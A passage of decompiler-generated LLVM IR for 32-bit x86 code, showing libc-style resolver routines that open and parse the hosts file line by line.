  %v1_8056342 = add i32 %v0_8056342, 8
  %v2_8056342 = inttoptr i32 %v1_8056342 to i8*
  %v3_8056342 = load i8, i8* %v2_8056342, align 1
  %v4_8056342 = zext i8 %v3_8056342 to i32
  %v1_8056346 = add i32 %v0_8056342, 9
  %v2_8056346 = inttoptr i32 %v1_8056346 to i8*
  %v3_8056346 = load i8, i8* %v2_8056346, align 1
  %v4_8056346 = zext i8 %v3_8056346 to i32
  %v2_805634a = mul nuw nsw i32 %v4_8056342, 256
  %v1_805634d = add i32 %v0_8056342, 10
  %v2_8056350 = or i32 %v4_8056346, %v2_805634a
  store i32 %v2_8056350, i32* @edx, align 4
  %v1_8056352 = load i32, i32* @ebp, align 4
  %v2_8056352 = add i32 %v1_8056352, 20
  %v3_8056352 = inttoptr i32 %v2_8056352 to i32*
  store i32 %v1_805634d, i32* %v3_8056352, align 4
  %v0_8056355 = load i32, i32* @edx, align 4
  %v1_8056355 = load i32, i32* @ebp, align 4
  %v2_8056355 = add i32 %v1_8056355, 16
  %v3_8056355 = inttoptr i32 %v2_8056355 to i32*
  store i32 %v0_8056355, i32* %v3_8056355, align 4
  %v1_805635f = add i32 %v3_80562cb, 10
  %v1_8056362 = load i32, i32* @ebp, align 4
  %v2_8056362 = add i32 %v1_8056362, 24
  %v3_8056362 = inttoptr i32 %v2_8056362 to i32*
  store i32 %v1_805635f, i32* %v3_8056362, align 4
  %v4_8056365 = load i32, i32* @edx, align 4
  %v5_8056369 = icmp slt i32 %v1_80562d3, %v4_8056365
  br i1 %v5_8056369, label %dec_label_pc_805636b, label %dec_label_pc_8056370

dec_label_pc_805636b:                             ; preds = %dec_label_pc_80562e3
  br label %dec_label_pc_8056374

dec_label_pc_8056370:                             ; preds = %dec_label_pc_80562e3
  %v1_8056370 = load i32, i32* @edi, align 4
  %v2_8056370 = add i32 %v4_8056365, 10
  %v3_8056370 = add i32 %v2_8056370, %v1_8056370
  br label %dec_label_pc_8056374

dec_label_pc_8056374:                             ; preds = %entry, %dec_label_pc_805636b, %dec_label_pc_80562dc, %dec_label_pc_8056370
  %v0_805637a = phi i32 [ %v4_80562b9, %entry ], [ -1, %dec_label_pc_805636b ], [ %v1_80562d3, %dec_label_pc_80562dc ], [ %v3_8056370, %dec_label_pc_8056370 ]
  %v2_805637c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805637c, i32* @ebx, align 4
  store i32 %v0_805628a, i32* @esi, align 4
  store i32 %v0_8056289, i32* @edi, align 4
  store i32 %v0_8056288, i32* @ebp, align 4
  ret i32 %v0_805637a

; uselistorder directives
  uselistorder i32 %v1_80562d3, { 0, 1, 3, 2 }
  uselistorder i32 %v3_80562cb, { 1, 0, 2 }
  uselistorder i32 %v4_80562b9, { 1, 0, 2, 3 }
  uselistorder i32 24, { 31, 32, 21, 0, 33, 34, 35, 22, 6, 11, 38, 12, 13, 14, 36, 23, 24, 25, 26, 27, 28, 29, 40, 3, 37, 15, 16, 17, 18, 19, 20, 4, 5, 7, 8, 9, 2, 10, 30, 1, 39 }
  uselistorder i32 20, { 37, 38, 39, 40, 6, 23, 44, 9, 45, 41, 42, 7, 24, 25, 5, 13, 14, 36, 15, 16, 17, 26, 27, 28, 0, 29, 1, 30, 10, 31, 32, 47, 43, 8, 18, 19, 20, 21, 22, 11, 33, 34, 35, 4, 3, 46, 12, 2 }
  uselistorder i32 9, { 20, 21, 22, 23, 10, 24, 14, 15, 5, 13, 3, 11, 16, 17, 18, 19, 9, 12, 6, 7, 8, 1, 0, 25, 4, 26, 2 }
  uselistorder i32 16777216, { 0, 2, 1, 4, 3, 6, 5, 8, 7, 10, 9 }
  uselistorder i32 3, { 59, 60, 61, 62, 63, 64, 26, 3, 27, 16, 58, 7, 65, 28, 9, 8, 4, 1, 2, 0, 29, 5, 30, 50, 17, 51, 37, 38, 39, 40, 41, 42, 66, 18, 19, 43, 31, 15, 11, 12, 10, 13, 32, 49, 44, 35, 56, 36, 57, 34, 45, 33, 46, 20, 47, 21, 48, 52, 53, 54, 55, 14, 22, 23, 24, 25, 6 }
  uselistorder i32 -10, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8056374, { 3, 1, 2, 0 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  %v3_8056391 = call i32 @__GI_fopen(i32 ptrtoint ([11 x i8]* @global_var_8060fa5.804 to i32), i32 ptrtoint (i32* @global_var_8060f70.792 to i32))
  store i32 %v3_8056391, i32* @eax, align 4
  %v1_8056399 = icmp eq i32 %v3_8056391, 0
  %v1_805639b = icmp eq i1 %v1_8056399, false
  br i1 %v1_805639b, label %dec_label_pc_80563b1, label %dec_label_pc_805639d

dec_label_pc_805639d:                             ; preds = %entry
  %v3_80563a9 = call i32 @__GI_fopen(i32 ptrtoint ([18 x i8]* @global_var_8060fb0.805 to i32), i32 ptrtoint (i32* @global_var_8060f70.792 to i32))
  br label %dec_label_pc_80563b1

dec_label_pc_80563b1:                             ; preds = %entry, %dec_label_pc_805639d
  %v0_80563b4 = phi i32 [ %v3_8056391, %entry ], [ %v3_80563a9, %dec_label_pc_805639d ]
  ret i32 %v0_80563b4

; uselistorder directives
  uselistorder i32 (i32, i32)* @__GI_fopen, { 3, 2, 1, 0, 6, 5, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_8060f70.792 to i32), { 0, 1, 2, 4, 3, 5 }
  uselistorder label %dec_label_pc_80563b1, { 1, 0 }
}

define i32 @__read_etc_hosts_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp59 = ptrtoint i32* %arg5 to i32
  %stack_var_-44 = alloca i8*, align 4
  %v0_80563b5 = load i32, i32* @ebp, align 4
  %v0_80563b6 = load i32, i32* @edi, align 4
  %v0_80563b7 = load i32, i32* @esi, align 4
  %v0_80563b8 = load i32, i32* @ebx, align 4
  store i32 %arg6, i32* @ebx, align 4
  store i32 %arg7, i32* %edx.global-to-local, align 4
  %v1_80563c6 = sub i32 0, %arg6
  %v1_80563c8 = urem i32 %v1_80563c6, 4
  %v2_80563c8 = icmp eq i32 %v1_80563c8, 0
  store i32 %v1_80563c8, i32* %eax.global-to-local, align 4
  br i1 %v2_80563c8, label %dec_label_pc_80563d9, label %dec_label_pc_80563cd

dec_label_pc_80563cd:                             ; preds = %entry
  %v2_80563cd = sub i32 %arg7, %v1_80563c8
  %v7_80563cd = icmp ugt i32 %v1_80563c8, %arg7
  br i1 %v7_80563cd, label %dec_label_pc_805667d, label %dec_label_pc_80563d5

dec_label_pc_80563d5:                             ; preds = %dec_label_pc_80563cd
  %v2_80563d5 = add i32 %v1_80563c8, %arg6
  store i32 %v2_80563d5, i32* @ebx, align 4
  store i32 %v2_80563cd, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80563d9

dec_label_pc_80563d9:                             ; preds = %entry, %dec_label_pc_80563d5
  %v0_80563e2 = phi i32 [ %arg6, %entry ], [ %v2_80563d5, %dec_label_pc_80563d5 ]
  %v0_80563e5 = phi i32 [ %arg7, %entry ], [ %v2_80563cd, %dec_label_pc_80563d5 ]
  %tmp149 = icmp ult i32 %v0_80563e5, 32
  br i1 %tmp149, label %dec_label_pc_805667d, label %dec_label_pc_80563e2

dec_label_pc_80563e2:                             ; preds = %dec_label_pc_80563d9
  %v1_80563e2 = add i32 %v0_80563e2, 32
  store i32 %v1_80563e2, i32* %eax.global-to-local, align 4
  %v1_80563e5 = add i32 %v0_80563e5, -32
  store i32 %v1_80563e5, i32* @ebp, align 4
  %v5_80563e8 = inttoptr i32 %v1_80563e2 to i8*
  %v12_80563ec = icmp eq i32 %arg4, 1
  br i1 %v12_80563ec, label %dec_label_pc_805650e, label %dec_label_pc_80563f7

dec_label_pc_80563f7:                             ; preds = %dec_label_pc_80563e2
  store i32 %arg9, i32* %eax.global-to-local, align 4
  %v1_80563fe = inttoptr i32 %arg9 to i32*
  store i32 -1, i32* %v1_80563fe, align 4
  %tmp150 = icmp ult i32 %v1_80563e5, 4
  br i1 %tmp150, label %dec_label_pc_805667d, label %dec_label_pc_805640a

dec_label_pc_805640a:                             ; preds = %dec_label_pc_80563f7
  %v0_805640a = load i32, i32* %edx.global-to-local, align 4
  %v1_805640a = add i32 %v0_805640a, -36
  store i32 %v1_805640a, i32* %eax.global-to-local, align 4
  %tmp151 = icmp ult i32 %v1_805640a, 8
  br i1 %tmp151, label %dec_label_pc_805667d, label %dec_label_pc_8056416

dec_label_pc_8056416:                             ; preds = %dec_label_pc_805640a
  %v0_8056416 = load i32, i32* @ebp, align 4
  %tmp152 = icmp ult i32 %v0_8056416, 16
  br i1 %tmp152, label %dec_label_pc_805667d, label %dec_label_pc_805641f

dec_label_pc_805641f:                             ; preds = %dec_label_pc_8056416
  %v1_805641f = add i32 %v0_805640a, -48
  store i32 %v1_805641f, i32* %eax.global-to-local, align 4
  %tmp153 = icmp ult i32 %v1_805641f, 8
  br i1 %tmp153, label %dec_label_pc_805667d, label %dec_label_pc_805642b

dec_label_pc_805642b:                             ; preds = %dec_label_pc_805641f
  %v0_805642b = load i32, i32* @ebx, align 4
  %v1_805642b = add i32 %v0_805642b, 48
  %v1_805642e = add i32 %v0_805640a, -44
  store i32 %v1_805642e, i32* @ebp, align 4
  %v1_8056435 = add i32 %v0_805640a, -56
  store i32 %v1_8056435, i32* @eax, align 4
  %v1_8056438 = add i32 %v0_805642b, 36
  store i32 %v1_8056438, i32* @edi, align 4
  %v7_805643b = icmp ult i32 %v1_8056435, %v1_805642e
  br i1 %v7_805643b, label %dec_label_pc_8056444, label %dec_label_pc_805643f

dec_label_pc_805643f:                             ; preds = %dec_label_pc_805642b
  %v1_805643f = add i32 %v0_805642b, 44
  store i32 %v1_805643f, i32* @esi, align 4
  br label %dec_label_pc_8056449

dec_label_pc_8056444:                             ; preds = %dec_label_pc_805642b
  %v1_8056444 = add i32 %v0_805642b, 56
  store i32 %v1_8056444, i32* @esi, align 4
  store i32 %v1_8056435, i32* @ebp, align 4
  br label %dec_label_pc_8056449

dec_label_pc_8056449:                             ; preds = %dec_label_pc_805643f, %dec_label_pc_8056444
  %v0_8056449 = phi i32 [ %v1_805642e, %dec_label_pc_805643f ], [ %v1_8056435, %dec_label_pc_8056444 ]
  %tmp154 = icmp ult i32 %v0_8056449, 80
  br i1 %tmp154, label %dec_label_pc_805667d, label %dec_label_pc_8056452

dec_label_pc_8056452:                             ; preds = %dec_label_pc_8056449
  %v0_8056452 = call i32 @__open_etc_hosts()
  store i32 %v0_8056452, i32* %eax.global-to-local, align 4
  %v1_805645b = icmp eq i32 %v0_8056452, 0
  br i1 %v1_805645b, label %dec_label_pc_805647f, label %dec_label_pc_805645f

dec_label_pc_805645f:                             ; preds = %dec_label_pc_8056452
  store i32 %v1_80563e2, i32* %edx.global-to-local, align 4
  store i32 %v1_805642b, i32* %eax.global-to-local, align 4
  store i8* %v5_80563e8, i8** %stack_var_-44, align 4
  %v0_805646a = load i32, i32* @edi, align 4
  %v0_8056476 = load i32, i32* @esi, align 4
  %v5_8056476 = inttoptr i32 %v0_8056476 to i8*
  br label %dec_label_pc_805652d

dec_label_pc_805647f:                             ; preds = %dec_label_pc_8056452
  store i32 %arg8, i32* %edx.global-to-local, align 4
  %v1_8056483 = inttoptr i32 %arg8 to i32*
  store i32 0, i32* %v1_8056483, align 4
  %v1_8056489 = call i32 @__errno_location(i32 0)
  store i32 %v1_8056489, i32* %eax.global-to-local, align 4
  %v1_805648e = inttoptr i32 %v1_8056489 to i32*
  %v2_805648e = load i32, i32* %v1_805648e, align 4
  store i32 %v2_805648e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805667d

dec_label_pc_8056499:                             ; preds = %dec_label_pc_8056600
  store i32 %stack_var_-40.0, i32* %eax.global-to-local, align 4
  %v2_805649d = load i8*, i8** %stack_var_-44, align 4
  %v3_805649d = ptrtoint i8* %v2_805649d to i32
  %v2_80564a0 = inttoptr i32 %stack_var_-40.0 to i32*
  store i32 %v3_805649d, i32* %v2_80564a0, align 4
  %v0_80564a2 = load i32, i32* %eax.global-to-local, align 4
  %v1_80564a2 = add i32 %v0_80564a2, 4
  %v2_80564a2 = inttoptr i32 %v1_80564a2 to i32*
  store i32 0, i32* %v2_80564a2, align 4
  store i32 %tmp59, i32* %edx.global-to-local, align 4
  %v0_80564ad = load i32, i32* @ebx, align 4
  %v1_80564ad = add i32 %v0_80564ad, 4
  %v2_80564ad = inttoptr i32 %v1_80564ad to i32*
  %v3_80564ad = load i32, i32* %v2_80564ad, align 4
  store i32 %v3_80564ad, i32* %eax.global-to-local, align 4
  store i32 %v3_80564ad, i32* %arg5, align 4
  %v0_80564b2 = load i32, i32* %edx.global-to-local, align 4
  %v1_80564b2 = add i32 %v0_80564b2, 8
  %v2_80564b2 = inttoptr i32 %v1_80564b2 to i32*
  store i32 2, i32* %v2_80564b2, align 4
  %v0_80564b9 = load i32, i32* %edx.global-to-local, align 4
  %v1_80564b9 = add i32 %v0_80564b9, 12
  %v2_80564b9 = inttoptr i32 %v1_80564b9 to i32*
  store i32 4, i32* %v2_80564b9, align 4
  br label %dec_label_pc_80564f2

dec_label_pc_80564c6:                             ; preds = %dec_label_pc_8056622
  store i32 %stack_var_-32.0, i32* %edx.global-to-local, align 4
  store i32 %stack_var_-36.0, i32* %eax.global-to-local, align 4
  %v2_80564ce = inttoptr i32 %stack_var_-32.0 to i32*
  store i32 %stack_var_-36.0, i32* %v2_80564ce, align 4
  %v0_80564d0 = load i32, i32* %edx.global-to-local, align 4
  %v1_80564d0 = add i32 %v0_80564d0, 4
  %v2_80564d0 = inttoptr i32 %v1_80564d0 to i32*
  store i32 0, i32* %v2_80564d0, align 4
  store i32 %tmp59, i32* %edx.global-to-local, align 4
  %v0_80564db = load i32, i32* @ebx, align 4
  %v1_80564db = add i32 %v0_80564db, 4
  %v2_80564db = inttoptr i32 %v1_80564db to i32*
  %v3_80564db = load i32, i32* %v2_80564db, align 4
  store i32 %v3_80564db, i32* %eax.global-to-local, align 4
  store i32 %v3_80564db, i32* %arg5, align 4
  %v0_80564e0 = load i32, i32* %edx.global-to-local, align 4
  %v1_80564e0 = add i32 %v0_80564e0, 8
  %v2_80564e0 = inttoptr i32 %v1_80564e0 to i32*
  store i32 10, i32* %v2_80564e0, align 4
  %v0_80564e7 = load i32, i32* %edx.global-to-local, align 4
  %v1_80564e7 = add i32 %v0_80564e7, 12
  %v2_80564e7 = inttoptr i32 %v1_80564e7 to i32*
  store i32 16, i32* %v2_80564e7, align 4
  br label %dec_label_pc_80564f2

dec_label_pc_80564f2:                             ; preds = %dec_label_pc_8056499, %dec_label_pc_80564c6
  %storemerge = phi i32 [ %stack_var_-40.0, %dec_label_pc_8056499 ], [ %stack_var_-32.0, %dec_label_pc_80564c6 ]
  %v1_80564f2 = load i32, i32* %edx.global-to-local, align 4
  %v2_80564f2 = add i32 %v1_80564f2, 16
  %v3_80564f2 = inttoptr i32 %v2_80564f2 to i32*
  store i32 %storemerge, i32* %v3_80564f2, align 4
  %v0_80564f5 = load i32, i32* @ebx, align 4
  %v1_80564f5 = add i32 %v0_80564f5, 8
  %v1_80564f8 = load i32, i32* %edx.global-to-local, align 4
  %v2_80564f8 = add i32 %v1_80564f8, 4
  %v3_80564f8 = inttoptr i32 %v2_80564f8 to i32*
  store i32 %v1_80564f5, i32* %v3_80564f8, align 4
  store i32 %arg8, i32* @eax, align 4
  %v0_80564ff = load i32, i32* %edx.global-to-local, align 4
  %v2_80564ff = inttoptr i32 %arg8 to i32*
  store i32 %v0_80564ff, i32* %v2_80564ff, align 4
  br label %dec_label_pc_805665d

dec_label_pc_805650e:                             ; preds = %dec_label_pc_80563e2
  store i8* null, i8** %stack_var_-44, align 4
  %.pre = inttoptr i32 %arg9 to i32*
  br label %dec_label_pc_805652d

dec_label_pc_805652d:                             ; preds = %dec_label_pc_805645f, %dec_label_pc_805650e
  %v1_8056531.pre-phi = phi i32* [ %v1_80563fe, %dec_label_pc_805645f ], [ %.pre, %dec_label_pc_805650e ]
  %stack_var_-32.0 = phi i32 [ %v1_805642b, %dec_label_pc_805645f ], [ 0, %dec_label_pc_805650e ]
  %stack_var_-36.0 = phi i32 [ %v1_80563e2, %dec_label_pc_805645f ], [ 0, %dec_label_pc_805650e ]
  %stack_var_-40.0 = phi i32 [ %v0_805646a, %dec_label_pc_805645f ], [ 0, %dec_label_pc_805650e ]
  %stack_var_4.0 = phi i32 [ %v0_8056452, %dec_label_pc_805645f ], [ %arg1, %dec_label_pc_805650e ]
  %stack_var_-20.0 = phi i8* [ %v5_8056476, %dec_label_pc_805645f ], [ %v5_80563e8, %dec_label_pc_805650e ]
  store i32 %arg9, i32* @edx, align 4
  store i32 1, i32* %v1_8056531.pre-phi, align 4
  %v4_8056649 = ptrtoint i8* %stack_var_-20.0 to i32
  %v2_80565e6 = inttoptr i32 %arg2 to i8*
  %v0_8056643120127 = load i32, i32* @edx, align 4
  %v3_805664d121128 = call i32 @fgets(i32 %v4_8056649, i32 %stack_var_4.0, i32 %v0_8056643120127)
  store i32 %v3_805664d121128, i32* @eax, align 4
  %v1_8056655122129 = icmp eq i32 %v3_805664d121128, 0
  %v1_8056657123130 = icmp eq i1 %v1_8056655122129, false
  br i1 %v1_8056657123130, label %dec_label_pc_8056544.lr.ph.lr.ph, label %dec_label_pc_805665d

dec_label_pc_8056544.lr.ph.lr.ph:                 ; preds = %dec_label_pc_805652d
  %v12_805661b = icmp eq i32 %arg3, 10
  %v12_80565f9 = icmp eq i32 %arg3, 2
  %v12_80565c0 = icmp eq i32 %arg4, 2
  %v1_80565c5 = icmp eq i1 %v12_80565c0, false
  %v1_80565fe = icmp eq i1 %v12_80565f9, false
  %v1_8056620 = icmp eq i1 %v12_805661b, false
  br label %dec_label_pc_8056544.lr.ph

dec_label_pc_8056544.lr.ph:                       ; preds = %dec_label_pc_8056544.lr.ph.lr.ph, %dec_label_pc_8056643.outer.backedge
  %stack_var_-28.0.ph131 = phi i32 [ 1, %dec_label_pc_8056544.lr.ph.lr.ph ], [ 2, %dec_label_pc_8056643.outer.backedge ]
  br label %dec_label_pc_8056544

dec_label_pc_8056544:                             ; preds = %dec_label_pc_8056544.lr.ph, %dec_label_pc_8056643.backedge
  %v3_805654c = call i32 @__GI_strchr(i8* %stack_var_-20.0, i32 35)
  store i32 %v3_805654c, i32* @eax, align 4
  %v1_8056554 = icmp eq i32 %v3_805654c, 0
  br i1 %v1_8056554, label %dec_label_pc_805655b, label %dec_label_pc_8056558

dec_label_pc_8056558:                             ; preds = %dec_label_pc_8056544
  %v1_8056558 = inttoptr i32 %v3_805654c to i8*
  store i8 0, i8* %v1_8056558, align 1
  br label %dec_label_pc_805655b

dec_label_pc_805655b:                             ; preds = %dec_label_pc_8056544, %dec_label_pc_8056558
  store i32 %v4_8056649, i32* @ecx, align 4
  store i32 0, i32* @edi, align 4
  %v2_805659b32 = load i8, i8* %stack_var_-20.0, align 1
  %v3_805659b33 = icmp eq i8 %v2_805659b32, 0
  %v1_805659e39 = icmp eq i1 %v3_805659b33, false
  br i1 %v1_805659e39, label %dec_label_pc_8056567.preheader.preheader, label %dec_label_pc_80565a0

dec_label_pc_8056567.preheader.preheader:         ; preds = %dec_label_pc_805655b
  %v4_805656797.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8056567.preheader

dec_label_pc_8056563:                             ; preds = %dec_label_pc_805656d
  store i8 0, i8* %v1_8056567102, align 1
  %v0_8056566 = load i32, i32* @ecx, align 4
  %v1_8056566 = add i32 %v0_8056566, 1
  store i32 %v1_8056566, i32* @ecx, align 4
  %v1_8056567 = inttoptr i32 %v1_8056566 to i8*
  %v2_8056567 = load i8, i8* %v1_8056567, align 1
  %v3_8056567 = zext i8 %v2_8056567 to i32
  %v4_8056567 = load i32, i32* %eax.global-to-local, align 4
  %v5_8056567 = and i32 %v4_8056567, -256
  %v6_8056567 = or i32 %v5_8056567, %v3_8056567
  store i32 %v6_8056567, i32* @eax, align 4
  %v4_8056569 = icmp eq i8 %v2_8056567, 0
  br i1 %v4_8056569, label %dec_label_pc_8056567.dec_label_pc_80565a0.loopexit_crit_edge, label %dec_label_pc_805656d

dec_label_pc_805656d:                             ; preds = %dec_label_pc_8056567.preheader, %dec_label_pc_8056563
  %v2_8056567103 = phi i8 [ %v2_8056567, %dec_label_pc_8056563 ], [ %v2_805656795, %dec_label_pc_8056567.preheader ]
  %v1_8056567102 = phi i8* [ %v1_8056567, %dec_label_pc_8056563 ], [ %v1_805656794, %dec_label_pc_8056567.preheader ]
  %v0_8056563101 = phi i32 [ %v1_8056566, %dec_label_pc_8056563 ], [ %v0_805656747, %dec_label_pc_8056567.preheader ]
  %v2_805656d = sext i8 %v2_8056567103 to i32
  store i32 %v2_805656d, i32* @edx, align 4
  %v0_8056570 = load i32, i32* @global_var_80612cc, align 4
  store i32 %v0_8056570, i32* %eax.global-to-local, align 4
  %v2_8056575 = mul nsw i32 %v2_805656d, 2
  %v3_8056575 = add i32 %v0_8056570, %v2_8056575
  %v4_8056575 = inttoptr i32 %v3_8056575 to i8*
  %v5_8056575 = load i8, i8* %v4_8056575, align 1
  %v6_8056575 = and i8 %v5_8056575, 32
  %v7_8056575 = icmp eq i8 %v6_8056575, 0
  %v1_8056579 = icmp eq i1 %v7_8056575, false
  br i1 %v1_8056579, label %dec_label_pc_8056563, label %dec_label_pc_805657b

dec_label_pc_805657b:                             ; preds = %dec_label_pc_805656d
  %v0_805657b = load i32, i32* @edi, align 4
  %v1_805657b = add i32 %v0_805657b, -6
  %v6_805657b = sub i32 5, %v0_805657b
  %v7_805657b = and i32 %v6_805657b, %v0_805657b
  %v8_805657b = icmp slt i32 %v7_805657b, 0
  %v9_805657b = icmp eq i32 %v1_805657b, 0
  %v10_805657b = icmp slt i32 %v1_805657b, 0
  %v3_805657e = icmp eq i1 %v10_805657b, %v8_805657b
  %v4_805657e = icmp eq i1 %v9_805657b, false
  %v5_805657e = and i1 %v4_805657e, %v3_805657e
  br i1 %v5_805657e, label %dec_label_pc_8056587.preheader, label %dec_label_pc_8056580

dec_label_pc_8056580:                             ; preds = %dec_label_pc_805657b
  %v1_8056580 = load i32, i32* @ebx, align 4
  %v3_8056580 = mul i32 %v0_805657b, 4
  %v4_8056580 = add i32 %v1_8056580, %v3_8056580
  %v5_8056580 = inttoptr i32 %v4_8056580 to i32*
  store i32 %v0_8056563101, i32* %v5_8056580, align 4
  %v0_8056583 = load i32, i32* @edi, align 4
  %v1_8056583 = add i32 %v0_8056583, 1
  store i32 %v1_8056583, i32* @edi, align 4
  %v0_8056587.pre.pre = load i32, i32* @ecx, align 4
  %v4_8056587.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056587.preheader

dec_label_pc_8056587.preheader:                   ; preds = %dec_label_pc_8056580, %dec_label_pc_805657b
  %v4_8056587.pre = phi i32 [ %v4_8056587.pre.pre, %dec_label_pc_8056580 ], [ %v0_8056570, %dec_label_pc_805657b ]
  %v0_8056587.pre = phi i32 [ %v0_8056587.pre.pre, %dec_label_pc_8056580 ], [ %v0_8056563101, %dec_label_pc_805657b ]
  %v1_80565a052 = phi i32 [ %v1_8056583, %dec_label_pc_8056580 ], [ %v0_805657b, %dec_label_pc_805657b ]
  %v1_8056587104 = inttoptr i32 %v0_8056587.pre to i8*
  %v2_8056587105 = load i8, i8* %v1_8056587104, align 1
  %v3_8056587106 = zext i8 %v2_8056587105 to i32
  %v5_8056587107 = and i32 %v4_8056587.pre, -256
  %v6_8056587108 = or i32 %v3_8056587106, %v5_8056587107
  store i32 %v6_8056587108, i32* @eax, align 4
  %v4_8056589109 = icmp eq i8 %v2_8056587105, 0
  br i1 %v4_8056589109, label %dec_label_pc_805659b.loopexit, label %dec_label_pc_805658d.lr.ph

dec_label_pc_805658d.lr.ph:                       ; preds = %dec_label_pc_8056587.preheader
  %v0_8056590.pre = load i32, i32* @global_var_80612cc, align 4
  br label %dec_label_pc_805658d

dec_label_pc_8056586:                             ; preds = %dec_label_pc_805658d
  %v1_8056586 = add i32 %v0_805659b110, 1
  store i32 %v1_8056586, i32* @ecx, align 4
  %v1_8056587 = inttoptr i32 %v1_8056586 to i8*
  %v2_8056587 = load i8, i8* %v1_8056587, align 1
  %v3_8056587 = zext i8 %v2_8056587 to i32
  %v5_8056587 = and i32 %v0_8056590.pre, -256
  %v6_8056587 = or i32 %v3_8056587, %v5_8056587
  store i32 %v6_8056587, i32* @eax, align 4
  %v4_8056589 = icmp eq i8 %v2_8056587, 0
  br i1 %v4_8056589, label %dec_label_pc_805659b.loopexit, label %dec_label_pc_805658d

dec_label_pc_805658d:                             ; preds = %dec_label_pc_805658d.lr.ph, %dec_label_pc_8056586
  %v2_8056587112 = phi i8 [ %v2_8056587105, %dec_label_pc_805658d.lr.ph ], [ %v2_8056587, %dec_label_pc_8056586 ]
  %v1_8056587111 = phi i8* [ %v1_8056587104, %dec_label_pc_805658d.lr.ph ], [ %v1_8056587, %dec_label_pc_8056586 ]
  %v0_805659b110 = phi i32 [ %v0_8056587.pre, %dec_label_pc_805658d.lr.ph ], [ %v1_8056586, %dec_label_pc_8056586 ]
  %v2_805658d = sext i8 %v2_8056587112 to i32
  store i32 %v2_805658d, i32* @edx, align 4
  store i32 %v0_8056590.pre, i32* @eax, align 4
  %v2_8056595 = mul nsw i32 %v2_805658d, 2
  %v3_8056595 = add i32 %v0_8056590.pre, %v2_8056595
  %v4_8056595 = inttoptr i32 %v3_8056595 to i8*
  %v5_8056595 = load i8, i8* %v4_8056595, align 1
  %v6_8056595 = and i8 %v5_8056595, 32
  %v7_8056595 = icmp eq i8 %v6_8056595, 0
  br i1 %v7_8056595, label %dec_label_pc_8056586, label %dec_label_pc_805659b.loopexit

dec_label_pc_805659b.loopexit:                    ; preds = %dec_label_pc_805658d, %dec_label_pc_8056586, %dec_label_pc_8056587.preheader
  %v4_805656797144 = phi i32 [ %v6_8056587108, %dec_label_pc_8056587.preheader ], [ %v6_8056587, %dec_label_pc_8056586 ], [ %v0_8056590.pre, %dec_label_pc_805658d ]
  %v0_805659b.lcssa = phi i32 [ %v0_8056587.pre, %dec_label_pc_8056587.preheader ], [ %v1_8056586, %dec_label_pc_8056586 ], [ %v0_805659b110, %dec_label_pc_805658d ]
  %v1_8056587.lcssa = phi i8* [ %v1_8056587104, %dec_label_pc_8056587.preheader ], [ %v1_8056587, %dec_label_pc_8056586 ], [ %v1_8056587111, %dec_label_pc_805658d ]
  %v2_805659b = load i8, i8* %v1_8056587.lcssa, align 1
  %v3_805659b = icmp eq i8 %v2_805659b, 0
  %v1_805659e = icmp eq i1 %v3_805659b, false
  br i1 %v1_805659e, label %dec_label_pc_8056567.preheader, label %dec_label_pc_80565a0

dec_label_pc_8056567.preheader:                   ; preds = %dec_label_pc_8056567.preheader.preheader, %dec_label_pc_805659b.loopexit
  %v1_80565a0.pre147 = phi i32 [ %v1_80565a052, %dec_label_pc_805659b.loopexit ], [ 0, %dec_label_pc_8056567.preheader.preheader ]
  %v4_805656797 = phi i32 [ %v4_805656797144, %dec_label_pc_805659b.loopexit ], [ %v4_805656797.pre, %dec_label_pc_8056567.preheader.preheader ]
  %v0_805656747 = phi i32 [ %v0_805659b.lcssa, %dec_label_pc_805659b.loopexit ], [ %v4_8056649, %dec_label_pc_8056567.preheader.preheader ]
  %v1_805656794 = inttoptr i32 %v0_805656747 to i8*
  %v2_805656795 = load i8, i8* %v1_805656794, align 1
  %v3_805656796 = zext i8 %v2_805656795 to i32
  %v5_805656798 = and i32 %v4_805656797, -256
  %v6_805656799 = or i32 %v5_805656798, %v3_805656796
  store i32 %v6_805656799, i32* @eax, align 4
  %v4_8056569100 = icmp eq i8 %v2_805656795, 0
  br i1 %v4_8056569100, label %dec_label_pc_80565a0, label %dec_label_pc_805656d

dec_label_pc_8056567.dec_label_pc_80565a0.loopexit_crit_edge: ; preds = %dec_label_pc_8056563
  %v1_80565a0.pre.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80565a0

dec_label_pc_80565a0:                             ; preds = %dec_label_pc_805659b.loopexit, %dec_label_pc_8056567.dec_label_pc_80565a0.loopexit_crit_edge, %dec_label_pc_8056567.preheader, %dec_label_pc_805655b
  %v1_80565a0 = phi i32 [ 0, %dec_label_pc_805655b ], [ %v1_80565a0.pre.pre, %dec_label_pc_8056567.dec_label_pc_80565a0.loopexit_crit_edge ], [ %v1_80565a0.pre147, %dec_label_pc_8056567.preheader ], [ %v1_80565a052, %dec_label_pc_805659b.loopexit ]
  %v0_80565a0 = load i32, i32* @ebx, align 4
  %v2_80565a0 = mul i32 %v1_80565a0, 4
  %v3_80565a0 = add i32 %v2_80565a0, %v0_80565a0
  %v4_80565a0 = inttoptr i32 %v3_80565a0 to i32*
  store i32 0, i32* %v4_80565a0, align 4
  %v0_80565a7 = load i32, i32* @edi, align 4
  %v7_80565aa = icmp sgt i32 %v0_80565a7, 1
  br i1 %v7_80565aa, label %dec_label_pc_80565b0, label %dec_label_pc_8056643.backedge

dec_label_pc_80565b0:                             ; preds = %dec_label_pc_80565a0
  br i1 %v12_80563ec, label %dec_label_pc_805667d, label %dec_label_pc_80565bb

dec_label_pc_80565bb:                             ; preds = %dec_label_pc_80565b0
  store i32 1, i32* @esi, align 4
  br i1 %v1_80565c5, label %dec_label_pc_80565dd.lr.ph, label %dec_label_pc_80565c7

dec_label_pc_80565dd.lr.ph:                       ; preds = %dec_label_pc_80565bb
  br label %dec_label_pc_80565dd

